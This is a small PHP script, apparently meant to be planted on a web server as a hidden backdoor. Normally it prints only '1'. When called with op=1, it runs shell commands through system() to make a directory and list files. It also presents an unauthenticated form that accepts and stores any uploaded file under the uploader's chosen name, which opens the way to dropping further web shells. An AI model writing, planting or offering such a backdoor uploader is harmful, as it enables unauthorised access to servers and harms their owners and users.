<?php
$flag= $_GET['op']; //ls.php?op=1
if ($flag == '1')
{
$a="mkdir ./SDSCAT"; //your catalog
system($a);
$a="ls -lo";
$ab=system($a);
if($_GET[action]=="upload"){
$uploaddir = 'SDSCAT/'; //your catalog
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
print "<pre>";
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
 print "File is valid, and was successfully uploaded. ";
  print "Here's some more debugging info:\n";
      print_r($_FILES);
      echo $uploadfile;
      } else {
  print "not efect:\n";
  print "not efect  \n";
  print_r($_FILES);
              }
 print "</pre>";}
              echo '<form enctype="multipart/form-data" action="?op=1&action=upload" method="POST">
                          <input type="hidden" name="MAX_FILE_SIZE" value="3000000" />
                         : <input name="userfile" type="file" />
                      <input type="submit" value="Send File" />
                              </form>';
}
                  ?>
<?php
echo "1";
?>
